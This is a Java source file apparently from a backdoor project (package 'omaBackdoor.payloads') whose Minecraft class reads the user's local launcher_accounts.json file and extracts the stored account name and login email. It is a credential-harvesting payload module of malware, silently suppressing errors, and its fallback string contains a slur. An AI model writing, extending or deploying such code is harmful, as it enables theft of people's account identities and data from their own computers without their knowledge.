package me.oma.omaBackdoor.payloads;

import java.io.*;

public class Minecraft
{
    public String getMCName() throws FileNotFoundException
    {

        try
        {
            File file = new File(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/launcher_accounts.json");
            FileInputStream fstream = new FileInputStream(file);
            DataInputStream in = new DataInputStream(fstream);
            BufferedReader br = new BufferedReader(new InputStreamReader(in));

            String line;
            while ((line = br.readLine()) != null)
            {
                if (line.toUpperCase().contains("\"NAME\""))
                {
                    return line.split(":")[1].replace("\"", "").replace(" ", "");
                }

            }
        }
        catch (Exception e)
        {
        }

        return "Poorfag doesn't even have Minecraft";
    }

    public String getMCEmail()
    {
        try
        {
            File file = new File(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/launcher_accounts.json");
            FileInputStream fstream = new FileInputStream(file);
            DataInputStream in = new DataInputStream(fstream);
            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            String line;

            while ((line = br.readLine()) != null)
            {
                if (line.toUpperCase().contains("\"USERNAME\""))
                {
                    return line.split(":")[1].replace("\"", "").replace(" ", "");
                }

            }
        }
        catch (Exception e)
        {
        }

        return "Poorfag doesn't even have Minecraft";
    }
}
